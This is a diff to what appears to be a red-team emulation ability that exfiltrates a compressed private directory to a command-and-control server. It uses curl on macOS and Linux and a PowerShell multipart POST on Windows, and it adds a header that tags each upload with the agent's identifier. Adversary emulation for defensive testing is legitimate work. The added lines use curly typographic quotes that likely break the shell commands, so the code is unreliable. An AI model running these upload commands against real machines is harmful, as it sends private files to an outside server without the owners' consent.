@@ -11,11 +11,11 @@
     darwin:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress.private}" #{server}/file/upload
+          curl -F "data=@#{host.dir.compress.private}" --header “X-Request-ID: #{paw}” #{server}/file/upload
     linux:
       sh:
         command: |
-          curl -F "data=@#{host.dir.compress.private}" #{server}/file/upload
+          curl -F "data=@#{host.dir.compress.private}" --header “X-Request-ID: #{paw}” #{server}/file/upload
     windows:
       psh,pwsh:
         command: |
@@ -30,5 +30,6 @@
           $web.setOption(2,13056);
           $web.open("POST", $url, $false);
           $web.setRequestHeader("Content-Type","multipart/form-data; boundary=$boundary");
+          $web.setRequestHeader(“X-Request-ID”,“#{paw}");
           $web.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
           $web.Send($bodyLines);
